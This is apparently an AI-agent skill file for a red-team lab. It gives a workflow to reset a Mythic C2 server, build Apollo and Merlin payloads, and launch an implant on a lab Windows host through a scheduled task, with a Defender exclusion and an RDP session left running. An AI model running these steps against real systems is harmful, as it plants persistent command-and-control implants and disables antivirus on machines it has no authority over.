---
name: sage-callback-bootstrap
description: Repo-local post-Mythic-reset Sage/foothold callback bootstrap workflow. Use when Codex, Claude Code, or an operator needs to create fresh Sage/Apollo payloads after Mythic reset, import a retained foothold callback config such as Merlin, launch a foothold on CASTELBLACK, check callback readiness, or rediscover live callback IDs for a Sage GOAD solve.
---

# Sage Callback Bootstrap

Use after `$sage-goad-reset` archives the active runtime databases, resets Mythic, and restarts local Sage.
Mythic reset changes payload crypto keys, so old payload files are invalid unless their exported callback config
is explicitly imported back into Mythic. The current clean-baseline workflow creates a fresh Apollo payload on
every reset and launches it inside a real `NORTH\samwell.tarly` interactive session on CASTELBLACK.

## Credentials

Do not store passwords in skills. Use `MYTHIC_ADMIN_PASSWORD`, a local gitignored Mythic `.env`, or an operator
secret manager. The bundled bootstrap script resolves environment credentials first.

## Payload Defaults

Sage and Apollo payload defaults belong in the repo-local skill `.env`, not in ad hoc command lines:

```bash
skills/sage-callback-bootstrap/.env
```

The tracked template is:

```bash
skills/sage-callback-bootstrap/.env.example
```

The file stores Sage model/API settings plus Apollo filename, callback, C2 timing, output, and download settings.
Set `APOLLO_CALLBACK_HOST` to the Mythic address reachable from GOAD. Shell variables and CLI arguments still
override the file for one-off builds.

## Retained Callback Setup

Use retained callback import only when the operator intentionally wants to reuse an existing payload binary after
Mythic reset. Export the live callback config before reset:

```bash
.venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py export-callback-config \
  --callback <foothold-display-id> \
  --output skills/sage-callback-bootstrap/merlin_callback_config.json
```

The exported config is gitignored, contains sensitive callback cryptographic material, and is written mode
`0600`. The import path is payload-agnostic: `bootstrap-reset` infers the payload type from the exported config
rather than taking a Merlin/Apollo-specific branch.

For the current Merlin R-C2 flow, run:

```bash
.venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py bootstrap-reset \
  --use-retained-callback \
  --retained-callback-config skills/sage-callback-bootstrap/merlin_callback_config.json
```

This creates Sage first, imports the retained Merlin callback config, and stops before any target-side payload
execution. After the operator launches the retained Merlin payload, check:

```bash
.venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py readiness \
  --runtime-dbs-archived \
  --foothold-payload-type merlin
```

## Legacy Baked Apollo Setup

The old RAM-backed `eval-defender-apollo` workflow is retained only as an opt-in legacy path. Export the live
Apollo callback config once, before taking a snapshot that contains the running process:

```bash
.venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py export-callback-config --callback <apollo-display-id>
```

The default output is `skills/sage-callback-bootstrap/apollo_callback_config.json`.

## Workflow

Inspect first:

```bash
.venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py inspect
```

During each clean-baseline reset, use:

```bash
.venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py bootstrap-reset
```

The command creates Sage first so a clean Mythic database assigns Sage callback display ID `1`, then builds and
downloads a fresh Apollo payload. The result reports `"mode": "fresh-interactive-apollo"` and includes the fresh
Apollo payload UUID.

Open a real Samwell RDP session before the deploy step:

```bash
printf '%s\n' "$SAGE_RUN_AS_PASSWORD" | xfreerdp3 \
  /from-stdin:force /u:'NORTH\samwell.tarly' /v:10.4.10.22 \
  /cert:ignore /sec:nla /w:1024 /h:768 /log-level:ERROR
```

In another terminal, stage and launch the fresh Apollo payload through the active interactive session:

```bash
.venv/bin/python skills/sage-mythic-payload-deploy/scripts/deploy_payload_via_ludus.py deploy \
  --payload-uuid <fresh-apollo-uuid> \
  --target-host CASTELBLACK \
  --serve-host <operator-tailscale-ip> \
  --run-as-user 'NORTH\samwell.tarly' \
  --launch-method scheduled-task-interactive \
  --add-defender-exclusion \
  --wait-callbacks-seconds 60
```

The interactive bootstrap path stages Apollo as `C:\Users\Public\apollo.exe` by default. `--add-defender-exclusion`
is intentionally narrow: it adds an operator-owned Defender exclusion for only that Apollo file path before
transfer. On the clean-baseline snapshot, Defender otherwise quarantines stock Apollo as
`Trojan:MSIL/MythicApollo.APM!MTB` after the callback is already live.

After the deploy helper observes a new Apollo callback, it runs `tsdiscon` on the Samwell session by default.
That closes the local RDP client without logging off the Windows session, so Apollo keeps running. Use
`--no-disconnect-interactive-session` only when you intentionally want the RDP desktop left open for diagnosis.

After the callback appears, run the callback preflight and readiness gate:

```bash
.venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py post-callback-preflight
.venv/bin/python skills/sage-callback-bootstrap/scripts/bootstrap_payloads.py readiness --runtime-dbs-archived
.venv/bin/python skills/sage-live-runner/scripts/sage_task.py callbacks
```

Do not run a solve unless readiness reports `ready: true`.

For the retired RAM-backed path only, pass `--use-baked-apollo` to `bootstrap-reset`. That imports
`apollo_callback_config.json`, waits for reconnect, and performs the same post-callback preflight automatically.

## Bundled Scripts

- `bootstrap_payloads.py`
- `check_merlin_c2.py`
